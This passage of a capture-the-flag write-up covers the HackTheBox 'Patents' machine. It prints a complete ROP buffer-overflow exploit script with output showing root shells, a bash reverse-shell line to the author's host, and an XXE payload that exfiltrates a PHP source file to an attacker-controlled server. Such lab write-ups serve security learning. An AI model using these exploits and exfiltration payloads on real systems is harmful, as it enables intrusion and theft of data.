From here, this is a relatively typical ROP buffer overflow. I’ll first use a ROP chain to leak the address of a libc function. Then I’ll use a second ROP to call `dup2` on each of `stdin`, `stdout`, `stderr`, and then execute a shell using [one\_gadget](https://github.com/david942j/one_gadget). I can calculate the offsets for both my local libc and the remote libc now:

```

root@kali# one_gadget /lib/x86_64-linux-gnu/libc.so.6
0xc84da execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xc84dd execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xc84e0 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0xe664b execve("/bin/sh", rsp+0x60, environ)
constraints:
  [rsp+0x60] == NULL
  
root@kali# one_gadget /opt/libc-database/db/libc6_2.28-0ubuntu1_amd64.so
0x50186 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x501e3 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x103f50 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

```

With `one_gadget`, it always take a bit of trial and error to see if any of the options work.

There’s one issue that comes up when I try this with the payload above, which comes from this code:

```

    int_result = access(object_decoded,4);
    if (int_result == -1) {
      FUN_system_log(6,"404 NOT FOUND: %s\n",object_decoded);
      FUN_send_404(msg_on_stack->connsd);
      (*DAT_00409430)((ulong)(uint)msg_on_stack->connsd,"file does not exist [HEAD]",0, (ulong)(uint)msg_on_stack->connsd);
      return -1;
    } 

```

It’s not completely clear to me what is happening the line after `FUN_send_404` is called, but it is causing a crash with my overwrite. Ideally, I would avoid this failed step. But to do that, I need to have `access` return that the process can access the given file. Luckily, I found the poor implementation of `url_decode` that allows me to add a null by sending `%xx`. So I’ll use that in my payload to make sure that I can point to a file that exists, and then a null, and then the rest of the overwrite.

#### Stage 2: Shell

Now I’ll add a rop that will run `dup2(socket_fd, i)` for each of i in 0, 1, 2 to get `stdin`, `stdout`, and `stderr`. Then I’ll return to the `one_gadget`.

```

### Stage 2: Shell
p = remote(ip, port)
rop =  pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(0) + p64(0) + p64(lfmserver.plt['dup2'])
rop += pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(1) + p64(0) + p64(lfmserver.plt['dup2'])
rop += pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(2) + p64(0) + p64(lfmserver.plt['dup2'])
rop += p64(one_gadget_addr)

log.info("Sending stage two rop")
p.sendline(payload.format(urllib.parse.quote(rop)))

p.recv(22)
p.interactive()

```

Locally, I get a shell:

```

root@kali# python3 pwn_patents_root.py local
[*] '/media/sf_CTFs/hackthebox/patents-10.10.10.173/lfmserver'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 127.0.0.1 on port 5000: Done
[+] Receiving all data: Done (46B)
[*] Closed connection to 127.0.0.1 port 5000
[*] Found socket address:          0x00007f1b520d78d0
[*] Calculated libc base address:  0x00007f1b51fdc000
[*] Calculated one gadget address: 0x00007f1b520a44da

[+] Opening connection to 127.0.0.1 on port 5000: Done
[*] Sending stage two rop
[*] Switching to interactive mode

$ id
uid=0(root) gid=0(root) groups=0(root)

```

### Shell

#### Remote

Given the setup, I can update my code with different constants for remote:

```

#!/usr/bin/env python3

import urllib.parse
from pwn import *

if len(sys.argv) != 2 or sys.argv[1] not in ['local','remote']:
    print(f"Usage: {sys.argv[0]} [target]\n  target is local or remote\n")
    sys.exit(1)
target = sys.argv[1]

### Context
lfmserver = ELF('./lfmserver')
if target == 'local':
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    ip = '127.0.0.1'
    port = 5000
    one_gadget_offset = 0xc84da
else:
    libc = ELF('/opt/libc-database/db/libc6_2.28-0ubuntu1_amd64.so', checksec=False)
    ip = '10.10.10.173'
    port = 8888
    one_gadget_offset = 0x501e3
sock_fd = 6

### Gadgets and payload template
pop_rdi     = p64(0x0000000000405c4b)
pop_rsi_r15 = p64(0x0000000000405c49)
payload = "CHECK /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd%xx" + "a"*125 + "{} LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n"

### Stage 1: libc leak
rop = pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(lfmserver.got['socket']) + p64(0) + p64(lfmserver.plt['write'])

p = remote(ip, port)
p.sendline(payload.format(urllib.parse.quote(rop)))
data = p.recvall()
socket_addr = u64(data.split(b'\n')[1][:8].ljust(8, b"\x00"))
log.info(f"Found socket address:          0x{socket_addr:016x}")
libc_base_addr = socket_addr - libc.symbols['socket']
log.info(f"Calculated libc base address:  0x{libc_base_addr:016x}")
one_gadget_addr = libc_base_addr + one_gadget_offset
log.info(f"Calculated one gadget address: 0x{one_gadget_addr:016x}")
print()

### Stage 2: Shell
p = remote(ip, port)
rop =  pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(0) + p64(0) + p64(lfmserver.plt['dup2'])
rop += pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(1) + p64(0) + p64(lfmserver.plt['dup2'])
rop += pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(2) + p64(0) + p64(lfmserver.plt['dup2'])
rop += p64(one_gadget_addr)

log.info("Sending stage two rop")
p.sendline(payload.format(urllib.parse.quote(rop)))

p.recv(22)
p.interactive()

```

Now I run it with `remote` to get a remote shell:

```

root@kali# python3 pwn_patents_root.py remote
[*] '/media/sf_CTFs/hackthebox/patents-10.10.10.173/lfmserver'
    Arch:     amd64-64-little                                    
    RELRO:    Partial RELRO                                      
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 10.10.10.173 on port 8888: Done                
[+] Receiving all data: Done (46B)                       
[*] Closed connection to 10.10.10.173 port 8888
[*] Found socket address:          0x00007f6cddc6d3e0
[*] Calculated libc base address:  0x00007f6cddb51000
[*] Calculated one gadget address: 0x00007f6cddba11e3

[+] Opening connection to 10.10.10.173 on port 8888: Done         
[*] Sending stage two rop
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$ hostname
patents

```

#### Stabilizing

The shell typically dies pretty quickly, in around 30-60 seconds. I added the following line to get a stable shell over `nc`:

```

p.sendline("bash -c 'bash -i >& /dev/tcp/10.10.14.30/443 0>&1'")

```

I could catch that in `nc`, and that’s how I solved the box. But I also did play with automating this, and it works as well:

```

### Listen for next connection
shell = listen(port=443)
p.sendline("bash -c 'bash -i >& /dev/tcp/10.10.14.30/443 0>&1'")
shell.wait_for_connection()
shell.sendline("""python -c 'import pty; pty.spawn("/bin/bash")'""")
shell.interactive(prompt='')

```

The shell comes back fine, and as a pty:

```

root@kali# python3 pwn_patents_root.py remote
[*] '/media/sf_CTFs/hackthebox/patents-10.10.10.173/lfmserver'
[*] '/media/sf_CTFs/hackthebox/patents-10.10.10.173/lfmserver'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 10.10.10.173 on port 8888: Done
[+] Receiving all data: Done (46B)
[*] Closed connection to 10.10.10.173 port 8888
[*] Found socket address:          0x00007f62dd0483e0
[*] Calculated libc base address:  0x00007f62dcf2c000
[*] Calculated one gadget address: 0x00007f62dcf7c1e3
[+] Opening connection to 10.10.10.173 on port 8888: Done
[*] Sending stage two rop
[+] Trying to bind to 0.0.0.0 on port 443: Done
[+] Waiting for connections on 0.0.0.0:443: Got connection from 10.10.10.173 on port 40688
[*] Switching to interactive mode
bash: cannot set terminal process group (1325): Inappropriate ioctl for device
bash: no job control in this shell
root@patents:/opt/checker_server# python -c 'import pty; pty.spawn("/bin/bash")'
root@patents:/opt/checker_server#

```

This shell has up arrows to get to previous commands, but lacks tab completion and ctrl-c to kill a process without killing the shell - If you know how to add that, *please* leave a comment.

## Finding root.txt

With a root shell, there’s no `root.txt`:

```

root@patents:~# ls -l
total 13
drwx------ 2 root root 12288 May 21  2019 lost+found
drwxr-xr-x 3 root root  1024 May 21  2019 snap

```

Looking at the various physical drives and how they are mounted on the file system, I see a potential issue:

```

root@patents:~# df
Filesystem     1K-blocks    Used Available Use% Mounted on
udev              976616       0    976616   0% /dev
tmpfs             201728   10296    191432   6% /run
/dev/sda2       15465340 4306628  10303468  30% /
tmpfs            1008624       0   1008624   0% /dev/shm
tmpfs               5120       0      5120   0% /run/lock
tmpfs            1008624       0   1008624   0% /sys/fs/cgroup
/dev/loop0         56192   56192         0 100% /snap/lxd/12631
/dev/loop1         55552   55552         0 100% /snap/lxd/10756
/dev/loop3         68352   68352         0 100% /snap/lxd/9239
/dev/loop2         91264   91264         0 100% /snap/core/8268
/dev/loop4         91264   91264         0 100% /snap/core/8039
/dev/sda3         999320  150760    779748  17% /boot
/dev/sdb1         498514    2331    465924   1% /root
/dev/sda4        1015632   24632    869760   3% /home
overlay         15465340 4306628  10303468  30% /var/lib/docker/overlay2/f585cc22899bc6089ed4038b0133223cb0d33582215687e3ff2812a8e0d5f632/merged
shm                65536       0     65536   0% /var/lib/docker/containers/8f8e5f3a7673181aa594c7eca241c899c130030ad5ece9a1c74ac64bb7b8f4be/mounts/shm

```

`/dev/sda2` is mounted on `/`. But `/dev/sdb1` is mounted on `/root`. So if there’s something actually in a `/root` on `/dev/sda2`, it won’t show. I can mount that device, and see that there is a `root.txt` in the original `/root`:

```

root@patents:~# mount /dev/sda2 /mnt
root@patents:~# ls /mnt/
bin   home            lib64       opt   sbin  tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  snap  usr
dev   initrd.img.old  media       root  srv   var
etc   lib             mnt         run   sys   vmlinuz
root@patents:~# ls /mnt/root/
root.txt  secret  snap

```

From there I can grab the flag:

```

root@patents:~# cat /mnt/root/root.txt
d63b0264************************

```

## Beyond Root - XXE Failures

I was curious why the XXE was failing to get some files but not others, and it turns out it comes down to the length of the file. When base64-encoded, `convert.php` is 8272 bytes:

```

root@5406ebbf26ef:/var/www/html/docx2pdf# base64 convert.php | wc -c
8272 

```

That’s too long to put on the end of a url and keep it under 2048 bytes. However, I can update the XXE to chain PHP filters to deflate and then base64-encode, and it works beautifully:

```

<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/docx2pdf/convert.php">
<!ENTITY % inception "<!ENTITY exfil SYSTEM 'http://10.10.14.30/data?%data;'>">

```

The resulting web request is:

```
10.10.10.173 - - [11/May/2020 22:37:03] "GET /data?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 HTTP/1.0" 404 -

```

To decode this data, I’ll user [CyberChef](https://gchq.github.io/CyberChef/):

![image-20200511224921795](https://0xdfimages.gitlab.io/img/image-20200511224921795.png)

I didn’t need this to continue, but it is neat to know. Some references suggested chaining PHP filters using `|`, but that originally threw me here because it doesn’t work. Both `|` and `/` work in a PHP console:

```

php > readfile('file');
test
php > readfile('php://filter/convert.base64-encode/resource=file');
dGVzdAo=
php > readfile('php://filter/convert.base64-encode|convert.base64-encode/resource=file');
ZEdWemRBbz0=
php > readfile('php://filter/convert.base64-encode/convert.base64-encode/resource=file');
ZEdWemRBbz0=
php > readfile('php://filter/zlib.deflate/convert.base64-encode/resource=file');
K0ktLuECAA==
php > readfile('php://filter/zlib.deflate|convert.base64-encode/resource=file');
K0ktLuECAA==

```

I was able to get this [added to PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/pull/158):

![image-20200512081907533](https://0xdfimages.gitlab.io/img/image-20200512081907533.png)